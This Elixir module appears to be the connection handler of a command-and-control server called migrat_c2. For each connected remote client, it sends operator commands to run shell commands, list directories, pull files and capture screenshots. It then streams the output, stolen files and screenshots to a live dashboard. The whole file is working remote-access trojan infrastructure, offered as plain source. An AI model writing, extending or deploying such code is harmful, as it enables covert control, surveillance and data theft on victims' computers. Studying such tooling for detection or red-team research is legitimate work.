defmodule Connections.Handler do
  use GenServer

  require Logger

  alias Connections.Translator
  alias Connections.Registry

  def start(client, ident) do
    Logger.info("in start")

    {:ok, server_pid} =
      DynamicSupervisor.start_child(
        Connections.HandlerSupervisor,
        Connections.Handler.child_spec(%{socket: client, ident: ident})
      )

    {:ok, pid} =
      Task.Supervisor.start_child(Connections.ReadloopSupervisor, fn ->
        read_loop(client, server_pid)
      end)

    :ok = :gen_tcp.controlling_process(client, pid)
    GenServer.cast(server_pid, {:started_readloop, pid})
  end

  def disconnect(process) do
    GenServer.cast(process, :disconnect)
  end

  def send_shell_command(process, command) do
    m = %Migrat.ShellCommand{
      command: command
    }

    GenServer.cast(process, {:shell_command, m})
  end

  def send_get_directory(process, path) do
    m = %Migrat.GetDirectory{
      path: path
    }
    GenServer.cast(process, {:get_directory, m})
  end

  def send_get_file(process, path) do
    m = %Migrat.GetFile{
      path: path
    }
    GenServer.cast(process, {:get_file, m})
  end

  def send_take_screenshot(process) do
    m = %Migrat.TakeScreenshot{}
    GenServer.cast(process, {:take_screenshot, m})
  end

  defp read_loop(client, server) do
    case client |> Translator.read_message(Application.fetch_env!(:migrat_c2, :initkey)) do
      {:ok, message} ->
        Logger.debug("read message #{inspect(message)}")
        GenServer.cast(server, message)
        read_loop(client, server)

      v ->
        Logger.info("error reading message")
        IO.inspect(v)
        Connections.Handler.disconnect(server)
    end
  end

  def start_link(default) do
    GenServer.start_link(__MODULE__, default)
  end

  @impl true
  def init(state) do
    Registry.connection_established(state.ident)
    {:ok, state}
  end

  @impl true
  def handle_cast({:ident, ident}, state) do
    Logger.info("process  got ident #{ident}")
    {:noreply, state}
  end

  def handle_cast({:shell_command, command}, state) do
    Logger.info("process  got shell_command #{command.command}")

    Translator.send_message(
      state.socket,
      :shell_command,
      command,
      Application.fetch_env!(:migrat_c2, :initkey)
    )
    |> handle_error()

    {:noreply, state}
  end

  def handle_cast({:shell_response, response}, state) do
    Logger.info("process  got shell_response #{response.output}")
    MigratC2.LiveUpdate.new_shellmessage(state.ident.id, response.output)
    Registry.insert_shell_line(state.ident.id, response.output)
    {:noreply, state}
  end

  def handle_cast({:get_file, message}, state) do
    Logger.info("process  got get_file")
    Translator.send_message(
      state.socket,
      :get_file,
      message,
      Application.fetch_env!(:migrat_c2, :initkey)
    )
    |> handle_error()

    {:noreply, state}
  end

  def handle_cast({:file, response}, state) do
    Logger.info("process  got file")
    MigratC2.LiveUpdate.command_response(state.ident.id, :get_file, response)
    {:noreply, state}
  end

  def handle_cast({:get_directory, message}, state) do
    Logger.info("process  got get_directory")
    Translator.send_message(
      state.socket,
      :get_directory,
      message,
      Application.fetch_env!(:migrat_c2, :initkey)
    )
    |> handle_error()

    {:noreply, state}
  end

  def handle_cast({:get_directory_response, response}, state) do
    Logger.info("process  got get_directory_response")
    MigratC2.LiveUpdate.command_response(state.ident.id, :get_directory, response)
    {:noreply, state}
  end

  def handle_cast({:take_screenshot, message}, state) do
    Logger.info("process  got take_screenshot")

    Translator.send_message(
      state.socket,
      :take_screenshot,
      message,
      Application.fetch_env!(:migrat_c2, :initkey)
    )
    |> handle_error()

    {:noreply, state}
  end

  def handle_cast({:screenshot, m}, state) do
    Logger.info("process got screenshot")
    IO.inspect(m)
    base64 = Base.encode64(m.data)
    MigratC2.LiveUpdate.new_screenshot(state.ident.id, base64)
    {:noreply, state}
  end

  def handle_cast(:disconnect, state) do
    Logger.info("process got disconnect command")
    Task.Supervisor.terminate_child(Connections.ReadloopSupervisor, state.readloop_pid)
    :gen_tcp.close(state.socket)
    Registry.connection_closed(state.ident.id)
    DynamicSupervisor.terminate_child(Connections.HandlerSupervisor, self())
    {:noreply, state}
  end

  def handle_cast({:started_readloop, pid}, state) do
    state = Map.put(state, :readloop_pid, pid)
    {:noreply, state}
  end

  def handle_error(val) do
    case IO.inspect(val) do
      {:error, reason} ->
        IO.inspect(reason)
        Connections.Handler.disconnect(self())

      val ->
        val
    end
  end
end
